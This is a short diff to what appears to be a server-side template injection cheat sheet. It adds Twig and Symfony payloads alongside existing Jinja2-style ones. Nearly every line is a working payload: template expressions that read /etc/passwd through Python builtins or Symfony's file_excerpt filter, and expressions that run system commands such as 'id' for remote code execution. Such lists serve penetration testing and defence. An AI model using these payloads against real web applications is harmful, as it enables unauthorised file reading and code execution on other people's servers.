@@ -68,3 +68,8 @@ To open a file : `{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").
 For remote code execution we can use : `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | In this command, it first imports the OS library and then runs the command 'id'.
 
 To get information regarding the current template : `{{ _self }}`
+
+he PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files : `{{ "/etc/passwd"|file_excerpt(1,-1) }}`
+
+For Remote Code Execution (RCE) : `{{ ['id'] | filter('system') }}`
+
